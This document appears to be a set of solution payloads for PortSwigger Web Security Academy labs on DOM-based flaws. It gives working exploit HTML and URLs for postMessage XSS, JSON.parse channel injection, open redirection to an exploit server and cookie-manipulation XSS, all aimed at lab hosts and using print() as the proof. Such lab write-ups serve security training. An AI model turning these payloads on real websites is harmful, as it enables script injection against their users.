## 1. DOM XSS using web messages

```html
<iframe src="https://0a110015045fd89385b2eff200440075.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```


## 2. DOM XSS using web messages and a JavaScript URL

```html
<!doctype html>
<html>
    <head>
        <!-- DOM XSS PoC - generated by DOM Invader part of Burp Suite -->
        <meta charset="UTF-8" />
        <title>Postmessage PoC</title>
        <script>
            function pocFrame(win) {           
                let msg = "javascript:print()//:https:";
                win.postMessage(msg, '*');          
            }
        </script>
    </head>
    <body>
        <iframe src="https://0a33000e037cf19480ac212f0024006e.web-security-academy.net/" onload="pocFrame(this.contentWindow)"></iframe>                    
    </body>
</html>
        
```


## 3. DOM XSS using web messages and JSON.parse

```html
<!doctype html>
<html>
    <head>
        <!-- DOM XSS PoC - generated by DOM Invader part of Burp Suite -->
        <meta charset="UTF-8" />
        <title>Postmessage PoC</title>
        <script>
            function pocLink() {
                let win = window.open('https://0a4000e9049e33af808b2b4c00b400da.web-security-academy.net/');
                let msg = "{\n    \"type\": \"load-channel\",\n    \"url\": \"javascript:print()\"\n}";
                
                setTimeout(function(){
                    win.postMessage(msg, '*');
                }, 5000);
            }
            function pocFrame(win) {           
                let msg = "{\n    \"type\": \"load-channel\",\n    \"url\": \"javascript:print()\"\n}";
                
                win.postMessage(msg, '*');          
            }
        </script>
    </head>
    <body>
        <a href="#" onclick="pocLink();">PoC link</a>          
        <iframe src="https://0a4000e9049e33af808b2b4c00b400da.web-security-academy.net/" onload="pocFrame(this.contentWindow)"></iframe>                    
    </body>
</html>
```


## 4. DOM-based open redirection

```
https://0a86000b0335932e8186200000220094.web-security-academy.net/post?postId=8&url=https://exploit-0a43008f032193b381891f1901d50004.exploit-server.net/exploit
```


## 5. DOM-based cookie manipulation

```
<iframe src="https://0ad200530363c7918274618600950082.web-security-academy.net/product?productId=2&a=%27%3E%3Cimg/src/onerror=print()%3E" />
```

